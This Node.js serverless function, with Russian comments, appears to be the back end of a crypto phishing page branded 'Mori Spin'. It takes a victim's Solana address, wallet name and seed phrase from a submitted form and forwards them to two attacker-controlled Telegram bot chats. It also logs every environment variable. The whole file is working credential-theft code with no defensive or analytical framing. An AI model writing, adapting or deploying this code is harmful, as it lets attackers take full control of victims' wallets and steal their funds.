const https = require('https');

// Вспомогательная функция для отправки сообщения (остается без изменений)
const sendMessageToBot = (botToken, chatId, message) => {
    return new Promise((resolve, reject) => {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const postData = JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });

        const req = https.request(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        }, (res) => {
            if (res.statusCode >= 200 && res.statusCode < 300) {
                resolve(res);
            } else {
                let errorData = '';
                res.on('data', (chunk) => errorData += chunk);
                res.on('end', () => {
                    console.error('Telegram API Error:', errorData);
                    reject(new Error(`Ошибка ответа от Telegram: ${res.statusCode}. Ответ: ${errorData}`));
                });
            }
        });

        req.on('error', reject);
        req.write(postData);
        req.end();
    });
};


exports.handler = async (event) => {
    // --- ДИАГНОСТИЧЕСКАЯ СТРОКА ---
    // Выводим в лог все переменные окружения, которые "видит" функция
    console.log('Environment Variables Received by Function:', JSON.stringify(process.env));
    // -----------------------------

    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    const { BOT_TOKEN_1, CHAT_ID_1, BOT_TOKEN_2, CHAT_ID_2 } = process.env;

    if (!BOT_TOKEN_1 || !CHAT_ID_1 || !BOT_TOKEN_2 || !CHAT_ID_2) {
        return { 
            statusCode: 500, 
            body: JSON.stringify({ message: "Одна или несколько переменных окружения для ботов не настроены на сервере." }) 
        };
    }

    try {
        const data = JSON.parse(event.body);
        const { solAddress, wallet, seedPhrase } = data;

        if (!solAddress || !wallet || !seedPhrase) {
            return {
                statusCode: 400,
                body: JSON.stringify({ message: "Отсутствуют необходимые данные." })
            };
        }

        const escapeHTML = (str) => {
            if (typeof str !== 'string') return '';
            return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        };

        const message = `
<b>🔔 Новая заявка | Mori Spin</b>

<b>Кошелёк:</b> ${escapeHTML(wallet)}
<b>SOL Адрес:</b> <code>${escapeHTML(solAddress)}</code>

<b>Сид фраза:</b>
<pre>${escapeHTML(seedPhrase)}</pre>
        `;

        const sendPromises = [
            sendMessageToBot(BOT_TOKEN_1, CHAT_ID_1, message),
            sendMessageToBot(BOT_TOKEN_2, CHAT_ID_2, message)
        ];

        await Promise.all(sendPromises);

        return {
            statusCode: 200,
            body: JSON.stringify({ message: "Успешно отправлено в оба чата" })
        };

    } catch (error) {
        console.error('Ошибка выполнения функции:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ message: `Внутренняя ошибка сервера: ${error.message}` })
        };
    }
};